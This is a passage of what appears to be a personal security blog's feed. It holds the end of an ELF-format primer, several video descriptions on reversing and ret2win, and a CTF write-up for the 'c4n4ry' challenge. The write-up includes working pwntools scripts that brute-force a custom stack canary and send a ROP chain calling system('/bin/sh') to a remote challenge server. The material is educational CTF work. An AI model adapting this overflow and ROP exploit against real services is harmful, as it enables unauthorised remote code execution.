&lt;p&gt;This stores exceptional handlers. When things go wrong this area can deal with it.&lt;/p&gt;

&lt;h3 id=&quot;gnu_stack&quot;&gt;GNU_STACK&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;stack&lt;/li&gt;
  &lt;li&gt;
    &lt;ul&gt;
      &lt;li&gt;This is just a place where things can be stored during runtime.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This GNU_STACK is responsible for the stack being excecutable. If this is not there then by default stack will be excecutable. If stack is enabled then user input can also be excecuted and can lead to a great havoc.&lt;/p&gt;

&lt;h2 id=&quot;elf-sections&quot;&gt;ELF Sections&lt;/h2&gt;

&lt;p&gt;This is also commonly called as section headers. This has the information needed for linking a target object file (dependencies) to the binary. This is needed on linktime but not on runtime.&lt;/p&gt;

&lt;h3 id=&quot;common-sections&quot;&gt;Common Sections&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;.text: This section contains the code for the binary.&lt;/li&gt;
  &lt;li&gt;.data: Holds all the initialised data.&lt;/li&gt;
  &lt;li&gt;.rodata: Holds the initialised read-only data.&lt;/li&gt;
  &lt;li&gt;.bss: Contain all the uninitialized data.&lt;/li&gt;
  &lt;li&gt;.plt: PLT (Procedure Linkage Table) is useful when it comes to getting address of functions in dynamically linked libraries.&lt;/li&gt;
  &lt;li&gt;.got: Contains all the resolved address of the functions from the dependecies.&lt;/li&gt;
  &lt;li&gt;.dynamic: Holds all needed information for dynamic linking.&lt;/li&gt;
  &lt;li&gt;.dynsym: table dedicated to dynamically linked symbols.&lt;/li&gt;
  &lt;li&gt;.strtab: string table of .symtab section.&lt;/li&gt;
  &lt;li&gt;.dynstr: string table of .dynsym section.&lt;/li&gt;
  &lt;li&gt;.interp: RTLD embedded string.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;end&quot;&gt;END&lt;/h2&gt;
&lt;p&gt;Hope you understood some basic concepts related to the ELF file format.&lt;/p&gt;

&lt;h2 id=&quot;sources&quot;&gt;sources:&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://www.intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/&quot;&gt;intezer&lt;/a&gt;
&lt;a href=&quot;https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/#program-headers&quot;&gt;linux-audit&lt;/a&gt;&lt;/p&gt;</content><author><name>tourpran</name></author><category term="Blogs" /><category term="ELF segment" /><category term="ELF section" /><summary type="html">Start:</summary></entry><entry><title type="html">Bruteforcing the Canary - 03</title><link href="http://localhost:4000/blogs/youtube/2020/08/30/video4.html" rel="alternate" type="text/html" title="Bruteforcing the Canary - 03" /><published>2020-08-30T00:00:00+05:30</published><updated>2020-08-30T00:00:00+05:30</updated><id>http://localhost:4000/blogs/youtube/2020/08/30/video4</id><content type="html" xml:base="http://localhost:4000/blogs/youtube/2020/08/30/video4.html">&lt;h2 id=&quot;description&quot;&gt;Description:&lt;/h2&gt;
&lt;p&gt;Challenge from PicoCTF 2019. Here I bruteforce the canary to make a ret2win attack.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/m4jSH7Xn9Vc&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;</content><author><name>tourpran</name></author><category term="YouTube" /><category term="YouTube" /><summary type="html">Description: Challenge from PicoCTF 2019. Here I bruteforce the canary to make a ret2win attack.</summary></entry><entry><title type="html">Our First Exploit - 02</title><link href="http://localhost:4000/blogs/youtube/2020/08/18/video3.html" rel="alternate" type="text/html" title="Our First Exploit - 02" /><published>2020-08-18T00:00:00+05:30</published><updated>2020-08-18T00:00:00+05:30</updated><id>http://localhost:4000/blogs/youtube/2020/08/18/video3</id><content type="html" xml:base="http://localhost:4000/blogs/youtube/2020/08/18/video3.html">&lt;h2 id=&quot;description&quot;&gt;Description:&lt;/h2&gt;
&lt;p&gt;Here I have used Pwntools with python and have used a popular attack called ret2win. This method is where we redirect the code excecution and make the program do what we want.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/21GW7xQqMqg&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;</content><author><name>tourpran</name></author><category term="YouTube" /><category term="YouTube" /><summary type="html">Description: Here I have used Pwntools with python and have used a popular attack called ret2win. This method is where we redirect the code excecution and make the program do what we want.</summary></entry><entry><title type="html">Reverse engineering Binaries - 01</title><link href="http://localhost:4000/blogs/youtube/2020/08/01/video2.html" rel="alternate" type="text/html" title="Reverse engineering Binaries - 01" /><published>2020-08-01T00:00:00+05:30</published><updated>2020-08-01T00:00:00+05:30</updated><id>http://localhost:4000/blogs/youtube/2020/08/01/video2</id><content type="html" xml:base="http://localhost:4000/blogs/youtube/2020/08/01/video2.html">&lt;h2 id=&quot;description&quot;&gt;Description:&lt;/h2&gt;
&lt;p&gt;This video I have explained the process of Reversing the binaries and to analyse the assembly which makes up the binary.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/BrfAbLYc1PA&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;</content><author><name>tourpran</name></author><category term="YouTube" /><category term="YouTube" /><summary type="html">Description: This video I have explained the process of Reversing the binaries and to analyse the assembly which makes up the binary.</summary></entry><entry><title type="html">Introduction to Assembly Programming - 00</title><link href="http://localhost:4000/blogs/youtube/2020/07/28/introduction.html" rel="alternate" type="text/html" title="Introduction to Assembly Programming - 00" /><published>2020-07-28T00:00:00+05:30</published><updated>2020-07-28T00:00:00+05:30</updated><id>http://localhost:4000/blogs/youtube/2020/07/28/introduction</id><content type="html" xml:base="http://localhost:4000/blogs/youtube/2020/07/28/introduction.html">&lt;h2 id=&quot;description&quot;&gt;Description:&lt;/h2&gt;
&lt;p&gt;This is the First video in a series called &lt;a href=&quot;https://www.youtube.com/watch?v=R-PxxdB7ISo&amp;amp;list=PL7cHg6AXcMXDaS3A8dk1e8uGtpdv59at8&amp;amp;ab_channel=tourpran&quot;&gt;binary Exploitation and Reverse Engineering&lt;/a&gt;. Here I talked about the Essence of Assembly Programming.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/R-PxxdB7ISo&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;</content><author><name>tourpran</name></author><category term="YouTube" /><category term="YouTube" /><summary type="html">Description: This is the First video in a series called binary Exploitation and Reverse Engineering. Here I talked about the Essence of Assembly Programming.</summary></entry><entry><title type="html">c4n4ry Writeup | zh3r0 CTF</title><link href="http://localhost:4000/blogs/writeup/2020/03/20/zhero-ctf.html" rel="alternate" type="text/html" title="c4n4ry Writeup | zh3r0 CTF" /><published>2020-03-20T00:00:00+05:30</published><updated>2020-03-20T00:00:00+05:30</updated><id>http://localhost:4000/blogs/writeup/2020/03/20/zhero-ctf</id><content type="html" xml:base="http://localhost:4000/blogs/writeup/2020/03/20/zhero-ctf.html">&lt;p&gt;I am so proud of my team (zh3r0). This was our first CTF and it went pretty well.&lt;/p&gt;

&lt;h2 id=&quot;challenge-description&quot;&gt;Challenge description:&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/imcanary.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;solution&quot;&gt;Solution:&lt;/h2&gt;
&lt;h3 id=&quot;first-step&quot;&gt;First step:&lt;/h3&gt;

&lt;p&gt;Analyze the binary and then check its mitigations.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mitigationscanary.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;NX is enabled so no shellcodes.&lt;/li&gt;
  &lt;li&gt;PIE is disabled and also ASLR was disabled so no worries of the address changing.
Now, let us run the binary and then see !!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/run.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can say that there was a continuous loop running. Also if we analyze the binary carefully we can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;input&lt;/code&gt; were not vulnerable but the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;description&lt;/code&gt; was using gets which reads arbitrary input.Now we can disassemble the main file now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/get.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;GETS is vulnerable but…&lt;/li&gt;
  &lt;li&gt;There is an additional memory compare.&lt;/li&gt;
  &lt;li&gt;We can say that it might be our canary.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;the-idea-for-the-exploit&quot;&gt;The idea for the exploit:&lt;/h3&gt;
&lt;p&gt;Our first step will be in calculating the offset for the canary. I use pwntools pwn cyclic function but you guys can do anything.&lt;/p&gt;

&lt;h3 id=&quot;inside-gdb&quot;&gt;Inside GDB:&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;I set a break at the memory compare.&lt;/li&gt;
  &lt;li&gt;I use pwntools to analyze what is being compared with what&lt;/li&gt;
  &lt;li&gt;Note: I also set up a fake canary to work with the binary locally&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/break.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;img src=&quot;/assets/images/break2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then I analyzed the string that was being compared with the help of pwntools.&lt;br /&gt;
I got the offset as 192 for the canary. Now let me make a script to get a shell.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'''
system address = 0x400780
'''&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;134.209.157.250&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5084&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;192&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'abcd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So I set the canary to be “abcd” and then I searched for some ROP and before that, I also got the offset for the ret to be 20 bytes.
So I created a &lt;strong&gt;ROP chain.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/c1.png&quot; alt=&quot;&quot; /&gt;
now it’s just combining all of the gadgets that’s it.&lt;/p&gt;
&lt;h3 id=&quot;final-step&quot;&gt;Final step:&lt;/h3&gt;
&lt;p&gt;I need to brute force the canary. It was damn easy cause i told them the hints that the canary was going to be small letters and was going to be in order.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;'''
sys = 0x400780
'''&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;134.209.157.250&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5084&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;192&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400936&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop r12
&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400933&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#  pop r11 
&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6020B0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#  just a random address to write to 
&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400927&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#  mov [r11], r12
&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0000000000400939&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop rdi
&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6020B0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#  write address
&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400780&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#  system
&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I just made the loop a bit big but what is the problem :P
&lt;img src=&quot;/assets/images/shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;end&quot;&gt;END&lt;/h2&gt;
&lt;p&gt;This was my first attempt to make a canary problem.So hope you liked this. Will be posting more blogs soon.&lt;/p&gt;</content><author><name>tourpran</name></author><category term="writeup" /><category term="CTF-Writeup" /><summary type="html">I am so proud of my team (zh3r0). This was our first CTF and it went pretty well.</summary></entry></feed>